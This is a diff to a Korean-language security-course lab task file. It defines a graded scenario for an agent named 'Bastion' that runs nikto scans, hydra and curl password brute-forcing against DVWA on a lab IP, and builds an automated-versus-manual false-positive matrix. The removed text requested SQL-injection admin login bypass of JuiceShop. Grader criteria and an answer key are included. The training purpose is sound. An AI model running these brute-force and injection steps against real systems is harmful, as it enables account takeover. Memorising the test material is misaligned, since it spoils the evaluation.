@@ -436,55 +436,121 @@ steps:
   risk_level: low
   bastion_prompt: 인증/세션 보안 종합 평가를 수행하시오. 발견된 취약점을 정리하고, 각 취약점에 대한 구체적인 방어 방안을 작성하라.
 - order: 99
-  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+  instruction: |
+    [복합 시나리오] "자동 vs 수동 점검 비교 — nikto/ZAP 자동 + hydra 브루트포스 + 오탐 필터링"
 
-    1) JuiceShop(:3000)의 로그인 API에 SQL Injection으로 관리자 인증을 우회하시오. admin@juice-sh.op
-    계정에 패스워드 없이 로그인해줘
+    ## 상황 (w12 → w13 시나리오 연속)
 
-    2) hydra를 사용하여 DVWA(:8080)의 로그인 페이지에 브루트포스 공격을 수행하시오. admin 계정의 패스워드를 찾아라해줘
+    > 선배: "이번 주 자동화 도구. nikto·ZAP·hydra 같은 자동 스캐너는 빠르지만 *오탐 (FP) 천지*야.
+    > 자동 스캔 결과를 수동 검증으로 거르는 게 핵심. 자동/수동 비교 매트릭스 + 오탐 필터링 가이드 만들어."
 
-    3) DVWA의 Brute Force 페이지에서 curl을 이용한 수동 브루트포스를 수행해줘
+    학습 목표 (lecture #1 ZAP + #2 nikto + #3 한계 + #4 오탐 필터) + (lab #2 hydra + #3 수동 브루트포스) 통합.
 
-    4) DVWA의 세션 쿠키 보안 속성을 분석하시오. HttpOnly, Secure, SameSite 플래그 설정 여부를 확인해줘
+    ## 임무 (3 단계, 약 35분)
 
-    5) 세션 고정(Session Fixation) 공격 가능성을 분석해줘'
-  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
-  category: multi_task
+    ### Phase A — nikto 자동 스캔 (lecture #2)
+    `nikto -h http://10.20.30.80 -maxtime 60 -nointeractive 2>&1 | head -40`
+    출력에서 "+ OSVDB-..." / "+ /admin/" / "+ Server: ..." 등 발견 라인 캡처. 자동 스캐너의 일반적 결과
+    형식과 오탐 가능 항목 (예: "Allowed HTTP Methods" 같은 정보 라인은 진짜 취약점 X) 명시.
+
+    ### Phase B — hydra 인증 브루트포스 + 수동 비교 (lab #2·#3)
+    1) hydra (자동):
+       `echo -e "admin\nadministrator\nroot\nuser" > /tmp/users.txt`
+       `echo -e "password\nadmin\n123456\nadmin123\npassword123" > /tmp/pwds.txt`
+       `hydra -L /tmp/users.txt -P /tmp/pwds.txt 10.20.30.80 http-post-form
+        "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+        -t 4 2>&1 | tail -10`
+    2) 수동 (curl):
+       `for pw in password admin 123456 admin123; do
+         echo -n "$pw: "; curl -s -o /dev/null -w "%{http_code} %{size_download}\n"
+         -X POST -d "username=admin&password=$pw" http://10.20.30.80/dvwa/login.php; done`
+       응답 크기 차이로 정답 추정.
+
+    ### Phase C — 자동 vs 수동 매트릭스 + 오탐 필터링 가이드
+    | 측면 | 자동 (nikto/ZAP) | 수동 (curl/Burp) | 권장 |
+    | 속도 | 분 단위 | 시간 단위 | 자동 → 수동 검증 흐름 |
+    | 정확도 | 60-80% (FP 많음) | 95%+ | 자동 후 수동 거르기 |
+    | 우회 룰 | 약함 (시그니처) | 강함 (창의적) | 수동 선호 |
+    | 범위 | 전체 매핑 | 핵심 endpoint | 자동 정찰 + 수동 심층 |
+
+    [오탐 필터링 가이드]
+    1. nikto "Allowed HTTP Methods OPTIONS" → 정보 노출일 뿐, 보통 FP
+    2. nikto "Server header reveals" → 헤더 제거 권고는 OK 지만 Critical 아님
+    3. ZAP "X-Frame-Options not set" → Critical 이 아니라 Medium
+    4. hydra "valid login" 출력 → 응답 분석 후 false positive 분리
+
+    종료: echo "=== Phase A nikto ===" / "=== Phase B hydra+curl ===" / "=== Phase C 매트릭스+오탐 ===" 묶음.
+  bastion_prompt: |
+    [복합 시나리오 — w13 자동 vs 수동]
+
+    JuiceShop / DVWA 자동 스캔 + 브루트포스 + 매트릭스 3 phase.
+
+    Phase A (nikto):
+    `nikto -h http://10.20.30.80 -maxtime 60 -nointeractive 2>&1 | head -40`
+    발견 라인 캡처 + 오탐 가능 항목 명시.
+
+    Phase B (hydra + curl):
+    `echo -e "admin\nadministrator\nroot\nuser" > /tmp/users.txt`
+    `echo -e "password\nadmin\n123456\nadmin123\npassword123" > /tmp/pwds.txt`
+    `timeout 30 hydra -L /tmp/users.txt -P /tmp/pwds.txt 10.20.30.80 http-post-form
+     "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 4 2>&1 | tail -10`
+    수동:
+    `for pw in password admin 123456 admin123; do
+      echo -n "$pw: "; curl -s -o /dev/null -w "%{http_code} %{size_download}\n"
+      -X POST -d "username=admin&password=$pw" http://10.20.30.80/dvwa/login.php; done`
+
+    Phase C (매트릭스 + 오탐):
+    ```
+    | 측면 | 자동 (nikto/ZAP) | 수동 (curl/Burp) | 권장 |
+    | 속도 | 분 단위 | 시간 단위 | 자동 → 수동 검증 |
+    | 정확도 | 60-80% (FP) | 95%+ | 자동 후 수동 거르기 |
+    | 우회 룰 | 약함 (시그니처) | 강함 (창의적) | 수동 선호 |
+    | 범위 | 전체 매핑 | 핵심 endpoint | 자동 정찰 + 수동 심층 |
+    ```
+
+    [오탐 필터링 가이드]
+    1. nikto "Allowed HTTP Methods OPTIONS" → 보통 FP
+    2. nikto "Server header" → Medium 정도, Critical 아님
+    3. ZAP "X-Frame-Options not set" → Medium
+    4. hydra "valid login" → 응답 분석 후 FP 분리
+
+    종료: echo "=== Phase A nikto ===" / "=== Phase B hydra+curl ===" / "=== Phase C 매트릭스+오탐 ===" 묶음.
+
+    반드시 3 phase 모두 실행. 중간 종료 금지.
+  hint: |
+    Phase A: nikto -maxtime 60 으로 1분 제한. 오탐 가능 라인 (Allowed Methods, Server header) 명시.
+    Phase B: hydra timeout 30 + 수동 curl 로 응답 크기 비교. DVWA 미설치 시 endpoint 변경 OK.
+    Phase C: 4행 매트릭스 + 4 오탐 가이드.
+    포인트: 자동 스캐너의 한계 인식 + 수동 검증 필요성.
+  category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: ''
+    expect: 매트릭스
     field: stdout
     semantic:
-      intent: '[통합] 인증/세션 심화 5작업 — session fix/bypass/token/OAuth/audit 통합. OWASP
-        A07 심화.'
+      intent: |
+        nikto 자동 스캔 + hydra 브루트포스 + curl 수동 비교 + 자동 vs 수동 매트릭스 + 오탐 필터링.
+        lecture #1·#2·#3·#4 + lab #2·#3 동시 행동 증명.
       success_criteria:
-      - 5 세션 작업
-      - bypass
-      - OAuth
+      - Phase A — nikto 실행 + 발견 라인 + 오탐 가능 명시
+      - Phase B — hydra 자동 + curl 수동 비교 (응답 크기·코드)
+      - Phase C — 4행 매트릭스 + 4 오탐 가이드
       acceptable_methods:
-      - bastion plan
-      - Burp
-      - JWT tool
+      - nikto / ZAP / wpscan 자동
+      - hydra / medusa 브루트포스
+      - curl 응답 크기·시간 비교
+      - markdown table
       negative_signs:
-      - bypass 실패
-      - OAuth 무시
-      - audit 누락
+      - 자동 또는 수동만
+      - 매트릭스 누락
+      - 오탐 필터링 가이드 누락
+      - 자동 vs 수동 비교 관점 누락
   target_vm: attacker
   risk_level: low
-  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
-
-    1) JuiceShop(:3000)의 로그인 API에 SQL Injection으로 관리자 인증을 우회하시오. admin@juice-sh.op
-    계정에 패스워드 없이 로그인해줘
-
-    2) hydra를 사용하여 DVWA(:8080)의 로그인 페이지에 브루트포스 공격을 수행하시오. admin 계정의 패스워드를 찾아라해줘
-
-    3) DVWA의 Brute Force 페이지에서 curl을 이용한 수동 브루트포스를 수행해줘
-
-    4) DVWA의 세션 쿠키 보안 속성을 분석하시오. HttpOnly, Secure, SameSite 플래그 설정 여부를 확인해줘
-
-    5) 세션 고정(Session Fixation) 공격 가능성을 분석해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: |
+    🤖 위 bastion_prompt 그대로. nikto → hydra+curl → 매트릭스+오탐 echo.
+  answer_detail: |
+    nikto / hydra 는 attacker VM 에 설치됨. DVWA endpoint 변동 시 JuiceShop login (/rest/user/login) 으로 대체.
+    핵심은 자동 도구의 한계 인식 + 오탐 필터링.
   script: ''
